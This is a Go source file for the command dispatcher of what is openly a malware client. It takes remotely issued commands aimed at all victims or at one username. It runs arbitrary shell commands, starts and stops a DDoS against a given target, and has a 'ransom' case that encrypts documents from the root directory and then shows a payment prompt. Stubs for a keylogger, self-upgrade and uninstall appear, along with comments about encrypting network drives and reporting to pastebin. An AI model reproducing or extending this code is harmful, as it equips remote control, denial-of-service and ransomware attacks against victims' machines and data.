package network

import (
	"fmt"

	"../aes"
	"../pay"
	"../utils"
)

import "../dos"

func Execute(command string, target string, args string) {
	if target == "*" || target == utils.GetUsername() {
		switch command {
		case "echo":
			fmt.Println(args)
			break
		case "cmd":
			utils.Run(args)
			break
		case "off":
			break
		case "lo":
			break
		case "kill":
			break
		case "msg":
			break
		case "web":
			break
		case "ddos":
			dos.DdosApi(100, args)
		case "sdd":
			dos.StopDdos()
		case "pass":
			break
		case "upgrade":
			break
		case "uninstall":
			break
		case "start-keylogger":
			break
		case "keylog":
			break
			//Send("res", KeyLogs)
		case "ransom":
			aes.EncryptDocumets("/", true)
			//Encrypt net drives

			// Once encrypted
			//WriteRegDone()
			// Write done to pastebin
			pay.PromtPay()

			//ListenForPayment()

		default:
			fmt.Println("Not a command", command, target, args)
			Send("res", "Not a command")
		}
	}
}
